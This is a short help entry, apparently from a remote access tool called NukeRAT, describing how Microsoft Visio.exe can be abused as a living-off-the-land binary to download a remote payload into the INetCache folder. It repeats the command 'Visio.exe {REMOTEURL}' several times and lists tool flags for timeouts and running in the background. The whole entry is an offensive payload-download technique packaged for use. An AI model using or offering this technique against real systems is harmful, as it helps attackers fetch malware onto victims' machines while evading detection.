ABOUT
    Microsoft Visio Executable. LOLBAS documents remote payload download
    into INetCache.

USAGE:
    Visio.exe {REMOTEURL}

EXAMPLES:
    Visio.exe {REMOTEURL}

NUKERAT FLAGS:
    -w <seconds>    Maximum wait time until timeout
    -bg             Fork and run without waiting for output

    Example:
    Visio.exe {REMOTEURL}
